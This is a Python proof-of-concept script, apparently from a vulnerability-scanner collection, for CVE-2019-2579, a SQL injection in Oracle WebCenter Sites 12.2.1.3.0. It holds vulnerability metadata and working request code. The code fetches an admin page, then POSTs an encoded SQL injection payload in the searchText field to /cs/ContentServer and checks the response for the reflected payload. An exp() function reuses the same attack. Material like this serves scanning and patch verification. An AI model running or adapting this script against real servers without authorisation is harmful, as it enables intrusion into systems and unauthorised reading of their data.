import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Oracle WebCenter Sites - SQL Injection''',
        "description": '''Vulnerability in the Oracle WebCenter Sites component of Oracle Fusion Middleware. The supported version that is affected is 12.2.1.3.0. Easily exploitable vulnerability allows low privileged attacker with network access via HTTP to compromise Oracle WebCenter Sites. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle WebCenter Sites accessible data.''',
        "severity": "medium",
        "references": [
            "https://outpost24.com/blog/Vulnerabilities-discovered-in-Oracle-WebCenter-Sites", 
            "https://github.com/Leovalcante/wcs_scanner"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2019-2579",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2019", "oracle", "wcs", "sqli"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        s = requests.Session()

        path = """/cs/Satellite?pagename=OpenMarket/Xcelerate/Admin/WebReferences"""
        method = "GET"
        data = """"""
        headers = {}
        resp0 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/cs/ContentServer"""
        method = "POST"
        data = """_authkey_={{authkey}}&pagename=OpenMarket%2FXcelerate%2FAdmin%2FWebReferences&op=search&urlsToDelete=&resultsPerPage=25&searchChoice=webroot&searchText=%27+and+%271%27%3D%270+--+"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp1 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""value='&#39; and &#39;1&#39;=&#39;0 --""" in resp1.text and """Use this utility to view and manage URLs""" in resp1.text) and (resp1.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url